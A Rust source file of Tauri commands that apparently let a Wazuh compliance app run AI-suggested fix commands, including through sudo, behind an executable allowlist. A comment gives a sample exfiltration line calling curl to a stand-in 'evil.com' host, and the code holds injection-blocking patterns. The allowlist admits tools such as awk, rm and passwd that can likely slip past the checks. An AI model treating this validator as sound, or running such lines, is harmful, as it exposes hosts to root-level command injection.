//! Tauri commands for AI integration.
//!
//! # Exposed Commands
//!
//! | Command               | Purpose                                        |
//! |-----------------------|------------------------------------------------|
//! | `save_ai_config`      | Store provider config to file                  |
//! | `get_ai_status`       | Return provider status (safe for frontend)     |
//! | `test_ai_connection`  | Ping the AI provider to verify credentials     |
//! | `clear_ai_config`     | Remove stored credentials                      |
//! | `ai_fix_check`        | Generate an AI fix for a single failed SCA check|
//! | `ai_chat`             | Send a follow-up chat message to the AI        |

use crate::ai;
use crate::ai::client::{AiClient, AiModel, AiProviderConfig, AiProviderStatus};
use crate::ai::fixer::{AiFixResult, FailedCheckInput};

// ── Commands ──────────────────────────────────────────────────────────────────

/// Save the AI provider configuration to the config file.
#[tauri::command]
pub async fn save_ai_config(config: AiProviderConfig) -> Result<(), String> {
    log::info!("Saving AI provider config for model: {}", config.model);
    ai::keychain::store_config(&config)
}

/// Return the current AI provider status (safe for frontend display).
#[tauri::command]
pub async fn get_ai_status() -> AiProviderStatus {
    ai::keychain::get_provider_status()
}

/// Test the AI provider connection by sending a minimal ping request.
#[tauri::command]
pub async fn test_ai_connection(config: AiProviderConfig) -> Result<String, String> {
    log::info!("Testing AI connection to: {}", config.base_url);
    let client = AiClient::new(config)?;
    client.ping().await
}

/// Remove all stored AI credentials.
#[tauri::command]
pub async fn clear_ai_config() -> Result<(), String> {
    log::info!("Clearing AI provider config");
    ai::keychain::clear_config()
}

/// Fetch available models from the AI provider.
#[tauri::command]
pub async fn list_ai_models(config: AiProviderConfig) -> Result<Vec<AiModel>, String> {
    log::info!("Fetching models from: {}", config.base_url);
    let client = AiClient::new(config)?;
    client.list_models().await
}

/// Generate an AI-powered fix for a single failed SCA check.
#[tauri::command]
pub async fn ai_fix_check(input: FailedCheckInput) -> AiFixResult {
    ai::fixer::generate_fix(input).await
}

/// Generate AI-powered fixes for multiple failed SCA checks.
#[tauri::command]
pub async fn ai_fix_batch(inputs: Vec<FailedCheckInput>) -> Vec<AiFixResult> {
    ai::fixer::generate_fixes_batch(inputs).await
}

/// Send a follow-up chat message to the AI, with optional context from a prior fix.
///
/// `context` is the previous AI response markdown (so the model remembers what
/// was discussed). `prompt` is the user's follow-up question.
#[tauri::command]
pub async fn ai_chat(prompt: String, context: Option<String>) -> Result<String, String> {
    log::info!("AI chat: prompt length {}", prompt.len());

    let config = ai::keychain::get_config()?;
    let client = AiClient::new(config)?;

    // Build a contextual prompt
    let full_prompt = match &context {
        Some(ctx) if !ctx.is_empty() => {
            format!(
                "Previous context (from our last exchange):\n\n{ctx}\n\n---\n\nNow the user asks:\n{prompt}"
            )
        }
        _ => prompt.clone(),
    };

    client.chat(&full_prompt).await
}

/// Run a command suggested by the AI on the host system.
/// This variant handles commands that do NOT require sudo.
///
/// # Security
/// The command is validated against an allowlist before execution.
#[tauri::command]
pub async fn execute_fix_command(command: String) -> Result<String, String> {
    log::info!("AI Command Execution requested: '{}'", command);

    validate_command(&command)?;

    run_shell_command(&command)
}

/// Run a sudo command with the provided password, using `sudo -S` (stdin-based auth).
/// This avoids the TTY prompt that causes the app to hang.
///
/// # Security
/// The original command (before sudo wrapping) is validated against an allowlist.
#[tauri::command]
pub async fn execute_fix_command_sudo(
    command: String,
    sudo_password: String,
) -> Result<String, String> {
    log::info!("AI sudo Command Execution requested (password provided)");

    // Validate the original command before wrapping with sudo
    validate_command(&command)?;

    // Strip any leading "sudo" so we can reconstruct the pipeline ourselves
    let stripped = command
        .trim()
        .strip_prefix("sudo")
        .unwrap_or(&command)
        .trim()
        .to_string();
    let sudo_cmd = format!(
        "echo {pw} | sudo -S -p '' {cmd}",
        pw = shell_escape(&sudo_password),
        cmd = stripped
    );

    run_shell_command(&sudo_cmd)
}

/// Restart the local wazuh-agent service to force an immediate SCA rescan.
///
/// This is the only native Wazuh method to trigger an on-demand SCA scan.
/// Wazuh is configured with `<scan_on_start>yes</scan_on_start>` by default,
/// so a restart immediately runs a fresh scan and pushes results to the manager.
///
/// # Security
/// The command is hardcoded on the backend (`systemctl restart wazuh-agent`),
/// so it is inherently safe and does not require allowlist validation.
#[tauri::command]
pub async fn trigger_sca_rescan(sudo_password: String) -> Result<String, String> {
    log::info!("Triggering SCA rescan via wazuh-agent restart");

    let cmd = format!(
        "echo {pw} | sudo -S -p '' systemctl restart wazuh-agent && echo 'Wazuh agent restarted successfully. SCA rescan started.'",
        pw = shell_escape(&sudo_password)
    );

    run_shell_command(&cmd)
}

// ── Command validation ────────────────────────────────────────────────────────
//
// SECURITY: All AI-generated commands MUST be validated against the allowlist
// below before execution. The command originates from LLM output, which can be
// manipulated via prompt injection, malicious SCA profiles, or AI hallucination.

/// Allowlist of base executables that are safe for AI-generated fix commands.
///
/// Each command in a shell pipeline / chain is extracted and checked against
/// this list. The list covers common system administration tools used by SCA
/// fix commands while excluding dangerous or unnecessary executables.
const ALLOWED_COMMANDS: &[&str] = &[
    // File content manipulation
    "sed",
    "awk",
    "grep",
    "egrep",
    "fgrep",
    "rg",
    "ag",
    "echo",
    "printf",
    "cat",
    "tee",
    "head",
    "tail",
    "cut",
    "tr",
    "sort",
    "uniq",
    "wc",
    "diff",
    "patch",
    // File system operations
    "chmod",
    "chown",
    "chgrp",
    "rm",
    "cp",
    "mv",
    "ln",
    "mkdir",
    "rmdir",
    "touch",
    "ls",
    "stat",
    // Service management
    "systemctl",
    "service",
    "init",
    "update-rc.d",
    "chkconfig",
    "sysctl",
    "modprobe",
    "depmod",
    "lsmod",
    // Network
    "ss",
    "netstat",
    "ip",
    "ifconfig",
    "route",
    "ping",
    "hostname",
    "nslookup",
    "dig",
    "getent",
    // SSH / remote access
    "sshd",
    "ssh-keygen",
    "ssh-keyscan",
    // Process management
    "ps",
    "pkill",
    "kill",
    "pgrep",
    "pidof",
    "killall",
    // System info
    "id",
    "whoami",
    "groups",
    "getenforce",
    "setenforce",
    "sestatus",
    "uname",
    "arch",
    "lscpu",
    "lsblk",
    "blkid",
    "df",
    "du",
    "mount",
    "umount",
    // User / group management
    "usermod",
    "groupmod",
    "useradd",
    "groupadd",
    "userdel",
    "groupdel",
    "passwd",
    "chpasswd",
    "chsh",
    "chage",
    "gpasswd",
    // Package management
    "apt",
    "apt-get",
    "apt-cache",
    "dpkg",
    "yum",
    "dnf",
    "rpm",
    "zypper",
    "snap",
    "flatpak",
    // Firewall
    "ufw",
    "iptables",
    "ip6tables",
    "nft",
    // System settings
    "timedatectl",
    "hostnamectl",
    "localectl",
    "loginctl",
    "locale-gen",
    "update-locale",
    "pam-auth-update",
    "pam_tally2",
    "faillock",
    // Crypto / keys
    "openssl",
    "gpg",
    "gpg2",
    "update-ca-certificates",
    "update-alternatives",
    // Logging
    "logrotate",
    "logger",
    // Audit
    "aureport",
    "ausearch",
    "auditctl",
    // Wazuh
    "wazuh-agent",
    "wazuh-control",
    "ossec-control",
    // Utilities
    "test",
    "which",
    "type",
    "find",
    "date",
    "sleep",
    "true",
    "false",
    // Shutdown / restart
    "reboot",
    "shutdown",
    "poweroff",
    "halt",
];

/// Normalize shell separators by inserting spaces around them so they
/// become distinct tokens in the subsequent `split_whitespace` pass.
///
/// This handles both `cmd1;cmd2` and `cmd1 ; cmd2`; without this,
/// a token like `"hello;curl"` would not be recognized as containing
/// a separator and `curl` would escape the allowlist check while still
/// executing via `sh -c`.
fn normalize_separators(s: &str) -> String {
    // Replace each separator with padded version so it becomes its own token.
    // Order matters: && and || must be replaced before single & and |.
    s.replace(";", " ; ")
        .replace("&&", " && ")
        .replace("||", " || ")
        .replace("|", " | ")
}

/// Extract all base executable names from a shell command string.
///
/// Handles pipelines (`|`), chaining (`&&`, `||`, `;`), and leading `sudo`.
/// Returns owned Strings so the caller does not borrow a local variable.
fn extract_base_commands(command: &str) -> Vec<String> {
    let normalized = normalize_separators(command);
    let tokens: Vec<&str> = normalized.split_whitespace().collect();
    let mut commands: Vec<String> = Vec::new();
    let mut expect_command = true;

    for token in &tokens {
        if expect_command {
            // Skip leading sudo — the wrapped command is what matters
            if *token == "sudo" {
                continue;
            }
            // Skip shell metacharacters that appear as standalone tokens
            if matches!(
                *token,
                "|" | ";" | "&" | "&&" | "||" | "<" | ">" | ">>" | "<<"
            ) {
                continue;
            }
            commands.push(token.to_string());
            expect_command = false;
        }

        // A shell separator means the next token starts a new command
        if matches!(*token, "|" | ";" | "&&" | "||") {
            expect_command = true;
        }
    }

    commands
}

/// Validate the target of `find -exec` / `find -execdir` against the allowlist.
///
/// `find` can dispatch arbitrary executables via `-exec`, bypassing the
/// top-level command extraction. This function scans the raw token list
/// for `-exec` / `-execdir` and validates the following token.
fn validate_find_exec(trimmed: &str) -> Result<(), String> {
    // Normalize separators the same way extract_base_commands does so that
    // tokens line up correctly (especially `;` in `\;`).
    let normalized = normalize_separators(trimmed);
    let tokens: Vec<&str> = normalized.split_whitespace().collect();
    let mut i = 0;

    while i < tokens.len() {
        let token = tokens[i];
        if token == "-exec" || token == "-execdir" {
            // Next token should be the executable to run
            if let Some(target) = tokens.get(i + 1) {
                // Skip flag-like tokens (e.g. "-p" in `find -exec -p ...`)
                if !target.starts_with('-') && !ALLOWED_COMMANDS.contains(target) {
                    return Err(format!(
                        "'{}' is not allowed as a target of `find -exec`. Only allowlisted commands can be used with -exec.",
                        target
                    ));
                }
            }
        }
        i += 1;
    }

    Ok(())
}

/// Validate that a command string only uses allowlisted executables and contains
/// no dangerous shell injection patterns.
///
/// Returns `Ok(())` if the command is safe, or `Err` with a description of the
/// violation.
fn validate_command(command: &str) -> Result<(), String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Err("Cannot execute an empty command".to_string());
    }

    // ── Block multi-line injection ────────────────────────────────────────
    // Newlines act as command separators in `sh -c` but are not shell
    // separator tokens, so `extract_base_commands` would not split on them,
    // allowing a second unvalidated command to execute.
    if trimmed.contains('\n') {
        return Err(
            "Multi-line commands are not allowed. Each code block must be a single command."
                .to_string(),
        );
    }

    // ── Block shell injection patterns ────────────────────────────────────
    // These allow attackers to execute arbitrary code regardless of the
    // base command allowlist.

    if trimmed.contains("$(") {
        return Err(
            "Command contains shell command substitution ($(...)) which is not allowed for security reasons"
                .to_string(),
        );
    }

    if trimmed.contains('`') {
        return Err(
            "Command contains backtick substitution (`...`) which is not allowed for security reasons"
                .to_string(),
        );
    }

    // ── Validate each base command against the allowlist ───────────────────

    let base_commands = extract_base_commands(trimmed);
    if base_commands.is_empty() {
        return Err("Could not determine any command to execute".to_string());
    }

    for cmd in &base_commands {
        if !ALLOWED_COMMANDS.contains(&cmd.as_str()) {
            return Err(format!(
                "'{}' is not in the allowed command list. AI execution is limited to a safe set of system administration tools.",
                cmd
            ));
        }
    }

    // ── Validate `find -exec` / `find -execdir` targets ────────────────────
    // `find` can dispatch arbitrary executables via `-exec` / `-execdir`,
    // which bypasses the top-level command extraction.  Example:
    //   find / -type f -exec curl http://evil.com \;
    //   → only `find` is extracted as a base command, but `curl` still runs.
    if base_commands.iter().any(|c| c == "find") {
        validate_find_exec(trimmed)?;
    }

    Ok(())
}

// ── Internal helpers ──────────────────────────────────────────────────────────

/// Shell-escape a string for safe interpolation into a shell command.
/// This wraps the value in single quotes and escapes any embedded single quotes.
fn shell_escape(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Run a shell command and return combined stdout or a descriptive error.
///
/// Callers MUST validate the `command` string with [`validate_command`] before
/// passing it here.
fn run_shell_command(command: &str) -> Result<String, String> {
    let output = if cfg!(target_os = "windows") {
        std::process::Command::new("powershell")
            .args(["-NoProfile", "-NonInteractive", "-Command", command])
            .output()
    } else {
        std::process::Command::new("sh")
            .args(["-c", command])
            .output()
    };

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();

            if out.status.success() {
                if stdout.is_empty() && !stderr.is_empty() {
                    Ok(stderr)
                } else if stdout.is_empty() {
                    Ok("Command executed successfully (no output).".to_string())
                } else {
                    Ok(stdout)
                }
            } else {
                // Filter out the sudo password prompt echo if it leaked
                let err_msg = if !stderr.is_empty() {
                    stderr
                } else if !stdout.is_empty() {
                    stdout
                } else {
                    format!("Command exited with status code: {:?}", out.status.code())
                };
                Err(err_msg)
            }
        }
        Err(err) => {
            log::error!("Failed to execute command: {:?}", err);
            Err(format!("System failed to execute process: {}", err))
        }
    }
}
